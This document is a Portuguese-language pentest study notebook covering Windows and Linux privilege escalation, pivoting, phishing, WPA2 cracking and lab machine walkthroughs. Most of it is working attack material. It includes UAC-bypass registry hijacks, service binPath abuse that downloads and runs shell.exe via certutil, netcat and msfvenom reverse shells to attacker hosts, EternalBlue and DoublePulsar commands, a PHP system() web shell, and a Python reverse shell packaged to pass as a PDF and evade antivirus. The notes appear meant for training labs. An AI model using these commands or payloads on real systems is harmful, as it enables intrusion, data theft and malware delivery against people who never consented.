Usuário com nível de administrador não faz atividades administrativas devido o level mandatory ser Medium sempre é perguntado pela UAC para dor o ok na permissão  e executar a ação, diferente do usuário que tem a permissão do mandatory High.

    Para saber o level:

        net user usuário. 

    Para  trocar de usuário no terminal 

        runas /user:username cmd


Estudo Técnico: Bypass UAC I e II

    Passos: 

        Encontrar programa que tenha o HIGH nos privilégios, executar ele escutando com o procmon, 

        Procurar por registros notfound no diretório do usuário HKCU, 

        Alterar/criar um registro que não tenha ainda sido criado e pedir para ele executar o cmd.exe. 

        Assim terá um cmd com acesso privilegiado.

        Fazer download dos programas SysinternalsSuite para servir de análise dos programas e suas permissões. 

        Principais: Procmon e sigcheck. 


Nota: Boa parte dos programas chamados pelo cmd está no system32

    internals: sigcheck.exe -a -m C:\Windows\System32\notepad.exe | computerdefaults.exe | fodhelper.exe 

        Mostra os privilégios que o programa precisa para funcionar. a Ideia é procurar o mais alto nível para explorar. Se o autoelevate estiver true, não será necessário a senha do administrador


Process Monitor Filtrar o nome do processo Computerdefaults.exe ou outro que tenha encontrado com privilégios. Depois executa o mesmo. Adicionar um filtro reg, filtrar o Path contains HKCU, Filtrar result contains name not found, Procurar registro shell open command que está setado como notfound. E adicionar o caminho reg add caminho/do/refistro/completo, Limpa a tela e executa o procmon de novo. Caso haja outra chamada em notfound adicionar ela reg add caminho/do/registro/completo /v DelegateExecute(nome endontrado) /t REG_SZ Já no filtro SUCCESS Verificar se já não há uma chamada sem valor e adicionar o cmd.exe com o comando reg add caminho/do/registro/completo /d "cmd.exe" /f Ou fazer via interface no registro. reiniciar o programa e o cmd.exe vai executar.

Windows PrivEsc: Certificate Dialog

CVE-2019-1388 Vulnerabilidade que tem um executável, já inclusive no github/jas502n/cve-2019-1388 Que quando executado, é necessário ver o sertificado da aplicação que automaticamente abre o internet-explorer como user system, que permite acessar os arquivos na barra de menu, que pode-se abrir o /windows/system32/cmd.exe quando o cmd abre, já abre como usuário system, podendo fazer qualquer modificação naquele alvo.

Windows PrivEsc: Serviços I e II

É uma falha onde você após estar com a shell, vai tentar identificar onde há serviços que são manipuláveis pelo seu usuário atual, alterando o path dele com um comando para injetar uma shell nele e ganhar acesso a nível de sistema...

    wmic service get Name,State,PathName | findstr "Runing" | findstr "Program"

    icacls "c:/caminho/do/programa/aqui.exe" 

        Se houver o (F) significa FULL ACCESS

        Alternativa

        accesschk.exe -wvcu "Users" * 


No sysinternals pode usar o programa passado e obter informações diretamente, assim podendo achar informações que o grupo users pode ter full access

    sc query NomeDoServico 

        Pegar informações do serviço

    sc qc NomeDoServico 

        Pegar informações do serviço

    sc config NomeDoServiço binPath="net user hack adm@123 /add" 

        Altera o Path para rodar o comando quando o programa for reiniciado

    sc stop NomeDoServico

    sc start NomeDoServico

    sc config NomeDoServiço binPath="certutils -urlcache -f http://ip:porta/shell.exe shell.exe"

        Criar uma shell com o msfvenom em exe

        Reiniciar o programa/serviço


    sc config NomeDoServiço binPath="shell.exe"

        Reiniciar o programa/serviço


Nota: Quando sem permissão de alterar o path do serviço nem reiniciar, pode-se tentar adicionar a shell no diretório deste serviço e substituir o nome da shell pelo nome do programa usando o comando MOVE e colocar para reiniciar o host, fazendo com que ao iniciar, o "programa" (shell) inicie junto.

Enumeração Host: Linux

    id

    cat /etc/passwd

    hostname

    uname -a

    cat /etc/issue 

        Versão exata do ubuntu/SO

    cat /etc/*-release 

        Informações de versões do sistema (search for exploits)

    dpkg -l | grep "wget"

    ifconfig -a

    route

    netstat -nlpu | nlpt 

    ps aux 

        Programas que estão em execução

    cat etc/crontab 

        Pega a tabela de agendamento de tarefas

    find / -writable -type d2>/dev/null 

        Pega os arquivos que tem permissão de escrita pelo user atual

    find / -perm -u=s -type f 

        Pega os arquivos do usuário com priv alto


    sudo -l 

        Lista prog que estão sendo executados pelo sudo


Enumeração automatizada: Linux

    LinPeas 

        Ferramenta de enumeração para linux, do criador do WinPeas GitHub/carlospolop/linpeas

    Linux-Exploit-Suggester 

        Outra ferramenta de enumeração linux - github/mzet-/linux...


Linux PrivEsc: Sudo

Quando dado o comando sudo -l ele te mostra quais programas são iniciados com o sudo... se caso tiver mostrando o VIM ou ALL

    vim -c '!id'

    sudo vim -c '!id'

    sudo vim -c '!bash' 


Linux PrivEsc: Permissões e Cron

Ao enumerar o host identificar possíveis diretórios com permissão de escrita.

    ls -la /etc/cron* 

        Lista as cron que roda no servidor

    cat /etc/crontab

    find / -type f -perm 777 2>/dev/null

    ls -la /etc/cron.outly/

        Se o arquivo tem permissão 777 editar e colocar o código..

    nc -e /bin/bash Ip-do-Atacante Porta


Desafio: Invadir os hosts 172.30.0.15,20,30,40 e pegar o acesso ao host coreserver

Linux PrivEsc: Kernel

Procurar por vulnerabilidades, podendo usar a ferramenta do Linux-Exploit-Suggester. Ao encontrar as CVEs pesquisar por exploits públicos, no exemplo DirtyCows cowroot.c

Com o exploit, deve-se atentar para o payload, identificando se o sistema é 32 ou 64bits

    gcc priv.c -o -pthread -m32 Usar o -m32 

        Para compilar para sistema 32bits, se 64 não passa nada. Usar –static caso tenha erro

    Com o arquivo em mãos 

        ./arquivo 

        E passará a ter acesso root ao sistema. 37.59.174.231/blog


    wget https://link.aqui.com -no-check-certificate 

        Wget com flag para não checar o certificado https



Pivoting: Da internet para a rede interna

Ao ganhar acesso a uma máquina na internet, verificar a possibilidade de navegar na rede interna daquele host, que é chamado de Pivoting. Usando uma shell para conectar com o Meterpreter

    meterpreter> ifconfig 

        Verificar as interfaces

    meterpreter> route 

        Verifica a tabela de roteamento

    meterpreter> run autoroute -s 10.10.20.0/24 

        Faz uma rota para a rede interna podendo ser varrida pelo meterpreter

    meterpreter> background 

        Deixar a sessão em segundo plano

    meterpreter> use auxiliary/server/socks4a 

        Módulo para comunicar com a máquina local RUN

    #sudo nano etc/proxychains.conf

        Editrar: 127.0.0.1 1080 Porta do modulo aberto no metasploit

    # proxychains nmap -v --open -sT -p 110,139 -Pn 10.10.20.0/24 

        Usar o proxychains para varrer a rede

Ao descobrir uma porta 10.10.20.4 porta 110 É possível fazer um tunelamento para a máquina atacante através do meterpreter na sessão do host principal

    meterpreter> sessions -i 1 

        Volta para a máquina que está exposta na internet

    meterpreter> portfwd -l 110 -p 110 -r 10.10.20.4

        Faz um portfwd com meterpreter

    # nmap -v -sV -p 110 10.10.20.4



    ENGENHARIA SOCIAL


    Livros:

        Arte de Invadir

        Arte de enganar

    Filmes:

        Prenda-me se for capaz

        VIPs


Campanhas de Phishing

Ferramenta GoPhish github/gophish/releases, coloca o ip no .config dá chmod e ./gophish e acessa o link configura alvo, template origem e o email caso seja Gmail smtp.gmail.com:587 a conta deve ter less security app access deve estar on e o 2FA desabilitado Login e senha é o email e senha do email de envio

Código indetectável pelos antivírus disfarçado de PDF

import socket,os

os.popen(explorer http://site.com/pdf)

ip = "192.168.25.2"

porta = 80

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip,porta))

while True:

    cmd = s.recv(1024)

    for comando in os.popen(cmd):

          s.send(comando)

    Podendo ser feito um exe usando o python

        pyinstaller.exe ..\cod.py --onefile --windowed --icon=pdf.ico


Nota: 	Criar um arquivo sfx com o winrar e abrir o código por trás dando acesso à shell da máquina

Cherrrytree Editor de texto bem organizado e bom para anotações de relatórios

    WIFI HACKING BONUS INTRODUÇÃO


Colocar a placa de rede wireless em modo monitor para escutar os dados que estão trafegando próximo da placa de rede.

    iwconfig 

        Informações da placa de wireless

    airmon-ng 

        Ferramenta de monitoramento de rede wireless

    airmon-ng check 

        Checa os processos abertos

    airmon-ng check kill 

        Mata os processos abertos

    iwconfig wlan1 mode monitor 

        Habilitar apenas a placa wireless sem matar os as outras redes 

    airmon-ng start wlan-interface 

        Habilitar o adaptador wireless para entrar em modo monitor

    tcpdump -vv -i wlan0mon 

        Capturar os sinais que estão próximos 

    airodump-ng wlan0mon 

        Capturar dados dos sinais wifi próximos e trazer informações organizadas

    airodump-ng wlan0mon -c1 

        Capturar dados dos sinais wifi que estão no canal 1

    airodump-ng wlan0mon -c1 --bssid MAC ADDRESS 

        Capturar dados dos sinal usando o MAC do rtr

    airmon-ng stop wlan0mon 

        Parar a captura dos sinais wifi

    service network-manager start 

        Restaura a rede wireless para o modo managed


Quando escutando no BSSID que é do roteador alvo e receber o MAC da estação e o modo de bloqueio for MAC e não a senha WPA2, pode-se trocar o MAC da placa de rede do atacante macchanger -m MA:CD:MA:C wlan-interf e subir a interface novamente para acessar a rede wifi.

Atacando o protocolo WPA2

    airodump-ng wlan0mon -c1 --bssid MAC ADDRESS -w captura.wpa2.cap

        Coloca em modo de captura salvando em arquivo.cap

    aireplay-ng -0 10 -a MAC-ROUTER -c MAC-CLIENT  wlan-interf 

        Manda 10 pacotes de  desautenticação. 

Quando aparecer o handshake no canto superior da tela, parar a captura e pagar o arquivo que foi salvo a captura.

    aircrack-ng captura.wpa.cap -w /caminho/wordlist 

        Faz um bruteforce da senha wpa capturada.

    airdecap-ng -p s3nh4d0w1f1 captura.cap -e ssid-em-texto 

        Vai gerar um arquivo para ler no wireshark


THAT'S ALL FOLKS

PENTEST EXPERIENCE

    SILK


    Host Silk: 

        https://www.100security.com.br/ms17-010 #eternalblue #doublepulsar 

	

172.16.1.145

    Alternativo Host Silk 145:  

        https://github.com/sailay1996/eternal-pulsar

Fazer o clone do repositório e entrar na pasta depens.

    msfvenom -p windows/shell_reverse_tcp LHOST=172.20.1.73 LPORT=8080 -f dll > shell.dll

        Cria payload para shell reverso


    wine cmd

    Em outro terminal: 

        rlwrap nc -vnlp 8080


    Eternalblue-2.2.0.exe --TargetIp 172.16.1.145 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt

    Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 172.16.1.145 --TargetPort 445 --DllPayload shell.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll

        Os dois comando acima vai mandar a shell no terminal que tava com a porta aberta pelo nc


    Na shell do alvo: 

        net user suporte 12345

        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f

        NetSh Advfirewall set allprofiles state off


    rdesktop 172.16.1.145 

        Acessa a máquina com login e senha criado acima


172.16.1.140

Elevar privilégios para acessar as pastas do... Após descobrir a Vulnerabilidade DiffieHellman pesquisar exploit... e prosseguir com as máquinas…

    https://github.com/jas502n/CVE-2019-1388

    Seguir o tutorial

        Abrir o arquivo.exe 

            -> abre o link do certificado 

                -> Salva a página no system32/cmd.exe e abrirá a shell com privilégios administrativos.

Navegar pelas pastas e abrir o WinScp.exe que vai dar acesso ao host 172.20.10.5

172.20.10.5

Elevar privilégios no host - Nmap Exploit

https://w0lfram1te.com/privilege-escalation-with-nmap

    sudo -l 

    sudo nmap --interactive

    nmap> !sh

    cat /etc/passwd e shadow

Captura as hashes e encontra a senha para o host 172.20.10.8 homologacao

172.20.10.8

Elevar privilégios no host - Kernel Exploit

https://book.hacktricks.xyz/linux-hardening/privilege-escalation

    cat /proc/version 

    searchsploit "linux-version"

    https://github.com/xiaoxiaoleo/CVE-2009-2698

        importar o arquivo no alvo (dar permissão) e executar



    BYTEINC


172.16.1.240

Ao descobrir uma vulnerabilidade no webmin de LFD com nmap, explorar com o exploit abaixo

    https://github.com/IvanGlinkin/CVE-2006-3392

Ao pegar o shadow e passwd, quebrar as senhas e acessar o server via ssh,ftp...


    ALGOR

172.16.1.116

Ao descobrir as tecnologias e portas abertas, procurar por algo na url que permita mandar um arquivo pra dentro da máquina... O acs_path= É encontrado no código fonte como hidden

Fazer um exploit com msfvenom em php/reverse_php > config.php (esse config é o arquivo que a vítima pega por padrão) abrir server http com python e deixar escutando na porta do exploit com netcat e inserir na URL vitma/adm.php/ACS_path=IP-ATACANTE:porta-do-srv-http/ 

PrivEsc do host 116

Varredura com o less.sh que mostra as possíveis vulnerabilidades e exploits

Após achar um exploit dirtcow rootcow.c ajustar para 32bits e executar

    gcc -m32 cowroot.c -o cowroot -pthread -static 

        Gera o executável (instalar pacote gcc-multilib se necessário)


172.16.1.195

Após analisar a aplicação com acesso admin, no campo de upload de arquivo pode se enviar um comando em php para a máquina usando um modelo de arquivo csv, separado por vírgula.

Após enviar uma shell reversa com NC, fazer uma enumeração do host usando less, linpeas e procurar vulnerabilidades.

comando com problema achado no linpeas -> /bin/bash -p

    Site para procurar comando de escalar privilégios

        https://gtfobins.github.io/gtfobins/bash/


Site para montar shell reverso https://www.revshells.com/


    ALUNMAQ


172.16.1.158

Bruteforce usado Hydra

hydra -s 80 -L users.txt -P /usr/share/wordlists/rockyou.txt 172.16.1.158 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=180&User=^USER^&Password=^PASS^&submit:failed" -I

Exploit 45010 encontrado pelo less.sh

    unoconv --format=docx Administrator.doc 

        Converter documentos antigos do WORD Office

    Quebrar senha xls planilha scheets:

        https://www.password-find.com/crack_office_password_js.htm



    GWCW

172.16.1.110

Bruteforcer: crowbar brute force alternativo do hydra mas inferior

    Exploit for rdp windows

        https://github.com/BlackMathIT/Esteemaudit-Metasploit 

kiwi e pega as creds necessárias

172.16.1.120

    Não é necessário Exploit vuln cuppa cms?

        https://www.exploit-db.com/exploits/25971


Exploração via Kernel usando o metasploit com banco de dados, abrindo sessão com ssh_login  e usando a sessão para o exploit:

    https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/freebsd/local/intel_sysret_priv_esc.rb

Ajuda: https://mysnippets443.wordpress.com/2020/03/09/metasploit-establish-a-ssh-session-for-further-use/


    PROSPEC           

                             

172.16.1.139

ENUMERACAO com nmap, dirb e metasploit

Procura pela internet por exploits:

https://www.exploit-db.com/exploits/14641 - Dir Transversal

https://www.exploit-db.com/exploits/50057 - RCE

172.16.1.156

ENUMERACAO com nmap, dirb e metasploit

Login e senha encontrado no lab anterior

Upload de payload .war e ganha a shell


    ASLA


172.16.1.155 

    Bruteforce no host com:

        Dirb no host com -X .pdf,.html,.txt,.htm

    Metasploit 

        Com ipfire oinkcode

    Client for FTP portable 

        https://www.ncftp.com/download/ 

    curl -v –disable-epsv -u user:pass ftp://172.30.10.101:2221/Inetpub/ 

        Conectar FTP via curl

    curl -v -T "shell.asp" -u user:pass ftp://172.30.10.101:2221/Inetpub/ 

        PUT via CURL

    meterpreter> portfwd add -l 8088 -p 80 -r 172.30.10.101 

        Redirecionamento de portas 8088 local da 80 remota OU

        add regra no firewall: any de fora para NAT 192.16.1.10 na  porta dest 2221. 

        Irá no IP do firewall liberar a porta 443 apontando para o IP interno 192.16.1.10 na mesma porta


Faz upload de uma shell.asp no msfvenom para o ftp pasta da web e chama com um multi/handler escutando. E pega o meterpreter do host 172.30.10.101 que é o server interno do firewall que foi criado a regra.


    DEVNIC


172.16.1.159

    Joomla... https://www.exploit-db.com/exploits/47465 adaptado

        python2 joomla-expl.py -t http://172.16.1.10/ --exploit --lhost 192.10.1.10 --lport 445

    Depois do comando com o nc 445 aberto pega a shell reversa

        getcap -r / 2>dev/null 

        Analisa saída

    wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

    https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c 

        PRIVESC

    PrivEsc com capabilities 

        https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/


172.16.1.148

Exploit da tecnologia usada no server drupa7-CVE-2018-7600.py (executa compilação no server alvo)

    NC Portable

        https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat

    Escalar privilegios com 

        https://www.exploit-db.com/exploits/37292 (pega a shell root)


Nota: Quando aparecer no gcc o erro undefined reference to 'openpty' usar a flag no gcc -lutil no fim 

           Ao compilar opte por compilar no alvo e se nao funcionar compila na sua máquina

Notas: DirtyCow - PrivEsc:

https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c Exploit PrivEsc

https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs

https://security.stackexchange.com/questions/145325/exploiting-dirty-cow-using-metasploit



NOVA GERAÇÃO DE PENTEST PROFISSIONAL

    script nomedoarquivo

        Salva/grava todo terminal até da EXIT

    nmap --min-rate=60000

        Envia/aumenta ao envio de pacotes para o host (detecção mais rápida)

    gobuster dir -u http://decstore.com.br -w /usr/share/dirb/wordlists/big.txt -t 100 -e --no-error -r -o gobuster -x php,bkp,old,txt,xml

        Bruteforce nos diretórios do domínio com 100 threads url completa sem retorno de erro, seguir caminho de redirecionamento e gravar tudo no arquivo gobuster com tipos de arquivos, dessa forma procurando por entry points.


Nota: Seclists baixar pasta de wordlists do github

    wc -l arquivo 

        Retorna a quantidade de linhas no arquivo

    hydra -v -t10 -l decstore -P wordlist ftp://decstore.com.br -s 2121 

        Faz um ataque de força bruta usando o hydra com 10 threads na porta 2121 (diferente da padrão)


Nota: Processo de força bruta com o BurpSuite send to intruder->clear_all->add_field->payload->options

    nc -v -C site.com.br 

        Mantém o terminal aberto.

 

    echo "http://website.com" | /root/go/bin/html-tool atribs src href | grep -i ".js" /root/go/bin/getJS --url http://web.site.com/redirecionamento.php --complete

        Ferramenta parsing website no github.com/tomnomnom e getJs para subir arquivos JS


Nota: Em uma URL com final e.x: ...downloads.php um possível teste de vulnerabilidade é testar com downloads.php?file=downloads.php (esse produtos.php é o arquivo que você quer analisar) "no for use \? para não interpretar" e nisso descobrir se há vulnerabilidade, o nome file pode estar em uma wordlist para rodar até encontrar o parâmetro correto. Outro teste que pode ser feito é colocar file=/../../../../../../etc/passwd

Nota: Instalar pacote de wordlists apt install seclists e selecionar a lista para usar no burp cp /usr/share/wordlists/seclists/Discovery/Web-content/burp-parameter-names.txt burp-param.txt

    wfuzz -c -z file,burp-param.txt --hl 0 http://site.com/downloads.php?FUZZ=download.php 

        Faz uma procura pelos parâmetros da lista na tentativa de encontrar um parâmetro vulnerável e explorá-lo e após encontrar o payload correto, tente colocar/navegar para encontrar outros arquivos e visualizando o código fonte.

    http://site.com/produtos.php?id=10 and 2=2# 

        Testes direto na URL de validação do banco de dados, se o banco retornar com a página mostrando aquele id é possível explorar o banco através de blind sql injection. 

    http://site.com/produtos.php?id=10 and(select*from*(select(sleep(10)))asdasd)#

        Outro modo de validação, se o banco demorar 10 segundos para responder é um indício de vulnerabilidade de blind sql injection. 

    http://site.com/produtos.php?id=10 and database()=char(EmDecimalCom;)#

        Validando o nome do banco de dados


COMANDOS PARA EXPLORAR VULN DE SQL

    sqlmap -v -u "http://site.com/produtos.php?id=10" --current-db --threads=10

        Analisa a database atual procurando por vulnerabilidades

    sqlmap -v -u "http://site.com/produtos.php?id=10" --dbs --threads=10

        Lista as databases dentro do server

    sqlmap -v -u "http://site.com/produtos.php?id=10" --threads=10 -D db_name --tables

        Lista as tabelas do banco selecionado

    sqlmap -v -u "http://site.com/produtos.php?id=10" --threads=10 -D db_name -T table_name --columns

        Lista as colunas da tabela selecionada

    sqlmap -v -u "http://site.com/produtos.php?id=10" --threads=10 -D db_name -T table_name -C 'nome,email,senha' --dump

        Lista os conteúdos das colunas selecionadas.

    hash-identifier cola_hash_para_descobrir 

        Identifica uma hash, o tipo da hash

    echo -n "word" | md5sum 

        Printa em MD5 uma palavra informada


Nota: Ferramentas para quebrar hash: hashcat, jhon 

TENTATIVA DE EXECUÇÃO DE CÓDIGO REMOTO FILE UPLOAD

    nano arquivo.php

        Crie um arquivo para fazer upload no site. (com o código abaixo)

<?php

			system($_GET['pentest']);	

			?>

    put arquivo.php 

        No FTP faça upload do arquivo criado

    site.com/diretório/arquivo.php?pentest=ifconfig 

        Acessar a url no diretório do arquivo e passando o parâmetro colocado no arquivo podendo executar comandos.

    cp /usr/bin/nc 

        Copie o binario do netcat

    put nc 

        No FTP faça o upload do netcat


Nota: Copie usando a url, o arquivo do netcat para um outro local e dê permissão 777 nele cp /tmp/ncat e depois podendo abrir uma shell reversa usando o nc em tmp.

    nc -vnlp 80 

        Abra uma conexão na sua máquina

    site.com/diretório/arquivo.php?pentest=/diretorio_netcat/nc 172.52.8.7 -e /bin/bash

        Mande para a sua máquina o terminal do servidor via netcat

    Comandos para dar spawn um bash mais interativo

        sudo python -c 'import pty; pty.spawn("/bin/sh")'

        sudo perl -e 'exec "/bin/sh";'

        sudo ruby -e ‘exec "/bin/sh"’

        python3 -c 'import pty;pty.spawn("/bin/bash")' 




ESCAPANDO PRIVILEGIOS

    find / -perm -u=s -type f 2>/dev/null 

        Procura por arquivos  com SUID BIT ativo e procurar por um arquivo diferente para tentar escalar privilégios

    echo "/bin/bash > cat 

        Dentro de tmp cria uma arquivo cat com bin/bash escrito dentro (dê chmod 777)

    env 

        Lista o PATH e outras infos

    echo $PATH  

        Lista o caminho total do PATH

    export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/tmp" 

        Modifica o PATH para chamar o cat dentro de TMP

            Agora só executar o arquivo ou se for uma cron, esperar ela rodar.


NOTA: Após comprometer um HOST e escalar privilégios, rode este comando para apresentar uma saída limpa e padrão OSCP: 

    cat /root/key.txt && hostname && id && whoami && ifconfig 


NOTA: Amostra sobre uma alternativa para ProxyChains o Privoxy. https://www.youtube.com/watch?v=y9iSVx4XWhQ

NOTA: Alternativa para teste de LFD /..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd

NOTA: Comando para uma shell interativa: echo 0 > /proc/sys/vm/dirty_writeback_centisecs


     INFORMATION GATHERING

    Websites for search: 

        https://consultas.plus/
        https://www.cnpj.world/
        https://urlscan.io/ 

     

    Fuzzing de SUBDOMINIOS
        https://github.com/netsecurity-as/subfuz


    Transferir arquivos do alvo para o atacante:
        netcat nc porta > file.etx | nc.exe -v ip porta < file.ext
        python httpserver
        Montar disco na maquina alvo para transferir arquivos 
        Colocar no site que tiver aberto e baixar
        Transferir via ssh scp file.ext user@ip:/home/user


    TIPO DE ARQUIVO PARA GOBUSTER DIRB BURPSUIT
        php,bkp,old,txt,xml,cgi,pdf,html,htm,asp,aspx,pl,sql
        Flag user agent  -a Mozilla/5.0

    Ferramenta animal par ENUMERAÇÃO WEB
        wapiti --url http://rh.businesscorp.com.br/

 

    Fazendo tunelamento com NGROK
        Acessa o site: https://ngrok.com/
        Cria a conta e pega o token
        Baixa o programa e joga na pasta bin
        ngrok authtoken TOKENAQUI
        ngrok http 80
        ngrok tcp 4455
        ~/.ngok2/ngrok.yml

                tunels:
                   tunnel_1:  
                      proto: http
                      addr: 80

        Salva e inicia...
        ngrok start --all: Abre as conexões configuradas no arquivo yml
